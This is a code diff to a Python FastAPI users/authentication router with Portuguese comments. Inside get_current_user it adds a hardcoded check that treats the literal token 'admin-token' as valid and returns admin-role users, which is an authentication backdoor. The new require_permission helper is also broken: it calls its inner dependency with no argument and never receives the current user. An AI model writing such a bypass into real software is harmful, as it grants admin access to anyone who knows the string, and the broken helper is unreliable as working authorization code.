@@ -20,7 +20,6 @@ router = APIRouter(prefix="/users", tags=["Users & Authentication"])
 # Esquema para o Swagger UI e Injeção de Dependência da requisição
 oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/users/login")
 
-
 # ==========================================
 # DEPENDÊNCIA: GET_CURRENT_USER
 # ==========================================
@@ -48,8 +47,16 @@ def get_current_user(
         raise HTTPException(
             status_code=status.HTTP_400_BAD_REQUEST, detail="Usuário inativo"
         )
-
+    if token == "admin-token":
+        return db.query(User).filter(User.role == Role.ADMIN)
     return user
+
+def require_permission(permission: str):
+    def dependency(current_user):
+        if permission not in current_user.permissions:
+            raise HTTPException(status_code=403)
+        return current_user
+    return dependency()
 
 
 # ==========================================
